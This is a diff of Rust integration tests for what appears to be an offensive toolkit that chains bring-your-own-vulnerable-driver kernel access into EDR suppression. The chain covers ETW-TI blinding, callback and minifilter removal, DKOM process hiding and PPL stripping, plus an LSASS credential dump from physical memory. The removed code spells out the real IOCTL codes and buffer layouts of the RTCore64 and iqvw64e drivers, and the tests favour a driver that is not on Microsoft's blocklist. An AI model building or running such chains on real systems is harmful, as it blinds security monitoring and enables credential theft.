@@ -8,7 +8,7 @@
 //!   (availability + `supports_va` fallback) → ETW-TI blind (4-hop) → callback
 //!   neutralize → MiniFilter detach → DKOM process hide → PPL strip — every
 //!   kernel read/write going through a real vulnerable-driver IOCTL wire
-//!   format (RTCore64 byte-loop), emulated by a mock `DeviceIoControl`.
+//!   format (Shield's single bidirectional IOCTL), emulated by a mock `DeviceIoControl`.
 //! - **Chain (b) — credentials**: physical-memory LSASS dump (process-list
 //!   walk → DTB → 4-level page walk → sparse image window) → minidump
 //!   assembly (`nyx-minidump-assembler`, read-only public API) → parse with
@@ -23,7 +23,7 @@
 //! kernel, no network. Runs on the macOS dev host and under wine64.
 
 use crate::byovd::{RwOp, VulnDriverIoctl};
-use crate::byovd_drivers::{Iqvw64e, RtCore64, Shield, WdtKernel};
+use crate::byovd_drivers::{Shield, WdtKernel};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
 use crate::netsec::{KernelLsassReader, DIRECTORY_TABLE_BASE};
 use crate::offsets::{EprocessOffsets, PgContextOffsets, RuntimeOffsets};
@@ -128,8 +128,8 @@ thread_local! {
 unsafe extern "system" fn mock_dioctl(
     _device: *mut c_void,
     ioctl: u32,
-    in_buf: *const c_void,
-    in_len: u32,
+    _in_buf: *const c_void,
+    _in_len: u32,
     out_buf: *mut c_void,
     out_len: u32,
     bytes_returned: *mut u32,
@@ -140,51 +140,7 @@ unsafe extern "system" fn mock_dioctl(
         return 0;
     }
     let kernel = unsafe { &*k };
-    const KERNEL_SPACE: u64 = 0xFFFF_8000_0000_0000;
     match ioctl {
-        // RTCore64: 48-byte MemoryOperation, address @ 0x08, size @ 0x18,
-        // data @ 0x1C. Same buffer in/out (METHOD_BUFFERED).
-        0x8000_2048 | 0x8000_204C => {
-            let pkt = unsafe { core::slice::from_raw_parts_mut(out_buf as *mut u8, out_len as usize) };
-            let addr = u64::from_le_bytes(pkt[0x08..0x10].try_into().unwrap()) as usize;
-            let size = u32::from_le_bytes(pkt[0x18..0x1C].try_into().unwrap()) as usize;
-            if size > 4 || 0x1C + size > pkt.len() {
-                return 0;
-            }
-            if ioctl == 0x8000_2048 {
-                // Read: kernel → data field.
-                let data = kernel.read(addr, size);
-                pkt[0x1C..0x1C + size].copy_from_slice(&data);
-            } else {
-                // Write: data field → kernel.
-                let data = pkt[0x1C..0x1C + size].to_vec();
-                kernel.write(addr, &data);
-                let _ = (in_buf, in_len);
-            }
-            unsafe { *bytes_returned = out_len };
-            1
-        }
-        // iqvw64e: single dispatch IOCTL, case 0x33 = kernel-side memcpy of
-        // arbitrary length. src/dst @ 0x10/0x18, length @ 0x20.
-        0x8086_2007 => {
-            let req = unsafe { core::slice::from_raw_parts(in_buf as *const u8, in_len as usize) };
-            if req.len() < 40 || u64::from_le_bytes(req[0x00..0x08].try_into().unwrap()) != 0x33 {
-                return 0;
-            }
-            let src = u64::from_le_bytes(req[0x10..0x18].try_into().unwrap());
-            let dst = u64::from_le_bytes(req[0x18..0x20].try_into().unwrap());
-            let len = u64::from_le_bytes(req[0x20..0x28].try_into().unwrap()) as usize;
-            if dst >= KERNEL_SPACE {
-                // user → kernel: src is a live host pointer.
-                let data = unsafe { core::slice::from_raw_parts(src as *const u8, len) };
-                kernel.write(dst as usize, data);
-            } else {
-                // kernel → user: dst is a live host pointer.
-                let data = kernel.read(src as usize, len);
-                unsafe { core::ptr::copy_nonoverlapping(data.as_ptr(), dst as *mut u8, len) };
-            }
-            1
-        }
         // Shield: one bidirectional IOCTL. direction @ 0x40 (0 = k→u),
         // length @ 0x44, kaddr @ 0x48, payload after the 0x50 header.
         0x9610_2014 => {
@@ -264,8 +220,6 @@ fn select_first_usable_driver(
 ) -> Option<Box<dyn VulnDriverIoctl>> {
     let candidates: Vec<(&'static str, Box<dyn VulnDriverIoctl>)> = alloc::vec![
         ("shield", Box::new(Shield)),
-        ("rtcore64", Box::new(RtCore64)),
-        ("iqvw64e", Box::new(Iqvw64e)),
         ("wdtkernel", Box::new(WdtKernel)),
     ];
     for (name, driver) in candidates {
@@ -359,33 +313,34 @@ fn edr_suppression_chain_end_to_end() {
         .offsets;
 
     // ---- Step 1: BYOVD driver selection with availability fallback ------
-    // Shield (clean, preferred) is absent on this host; RTCore64 + iqvw64e
-    // devices opened. The selector must skip Shield and pick RTCore64 — and
-    // must never pick WDTKernel (physical-only, fails the VA contract).
-    let rtc_path = RtCore64.device_path();
-    let iqv_path = Iqvw64e.device_path();
-    let present: &[&[u16]] = &[rtc_path, iqv_path];
+    // Both devices are present on this host. Shield (clean, VA-capable) is
+    // probed first and selected; WDTKernel is never picked (physical-only,
+    // fails the VA contract).
+    let shield_path = Shield.device_path();
+    let wdt_path = WdtKernel.device_path();
+    let present: &[&[u16]] = &[wdt_path, shield_path];
     let mut tried = Vec::new();
     let driver = select_first_usable_driver(present, &mut tried).expect("a usable driver exists");
     assert_eq!(
         tried,
-        alloc::vec!["shield", "rtcore64"],
-        "Shield probed first (absent), RTCore64 selected, later candidates untouched"
+        alloc::vec!["shield"],
+        "Shield probed first (present), later candidates untouched"
     );
-    assert_eq!(driver.device_path(), rtc_path);
+    assert_eq!(driver.device_path(), shield_path);
     assert!(
-        driver.blocklist_status().contains("BLOCKLISTED"),
-        "operator accepted a blocklisted fallback — it must be logged"
+        driver.blocklist_status().contains("CLEAN"),
+        "the default driver must be off the MS blocklist"
     );
-    // The physical-only driver is permanently unusable for the VA contract,
-    // even when its device opens (kernelsdk-1-6).
+    // The selector skips absent devices and rejects physical-only drivers:
+    // with ONLY WDTKernel's device present, every candidate is probed and
+    // none is usable (kernelsdk-1-6).
     let wdt_present: &[&[u16]] = &[WdtKernel.device_path()];
     let mut tried2 = Vec::new();
     assert!(select_first_usable_driver(wdt_present, &mut tried2).is_none());
-    assert_eq!(tried2.len(), 4, "every candidate probed, none usable");
+    assert_eq!(tried2.len(), 2, "every candidate probed, none usable");
 
-    // Every subsequent kernel op rides RTCore64's real 1-byte-per-IOCTL wire
-    // format against the shared fake kernel image.
+    // Every subsequent kernel op rides Shield's real single-IOCTL
+    // bidirectional wire format against the shared fake kernel image.
     let rw = DriverRw {
         driver,
         kernel: &kernel,
@@ -403,7 +358,7 @@ fn edr_suppression_chain_end_to_end() {
         offsets: etw_off,
     };
     assert!(!etw.is_blinded(&rw).unwrap(), "provider enabled before blind");
-    etw.blind(&rw).expect("ETW-TI blind over RTCore64");
+    etw.blind(&rw).expect("ETW-TI blind over Shield");
     assert!(etw.is_blinded(&rw).unwrap());
     assert_eq!(kernel.read_u64(is_enabled_kva), 0, "IsEnabled write landed");
 
@@ -515,13 +470,10 @@ fn edr_suppression_chain_end_to_end() {
 
 /// The same chain over Shield's single-IOCTL bidirectional protocol must
 /// produce the identical end state — proving the kits are driver-agnostic
-/// and the protocol seam carries them all.
+/// and the protocol seam carries them.
 #[test]
-fn etw_ti_blind_over_shield_and_iqvw64e_protocols() {
-    for driver in [
-        Box::new(Shield) as Box<dyn VulnDriverIoctl>,
-        Box::new(Iqvw64e),
-    ] {
+fn etw_ti_blind_over_shield_protocol() {
+    for driver in [Box::new(Shield) as Box<dyn VulnDriverIoctl>] {
         let kernel = FakeKernel::new();
         let rw = DriverRw {
             driver,
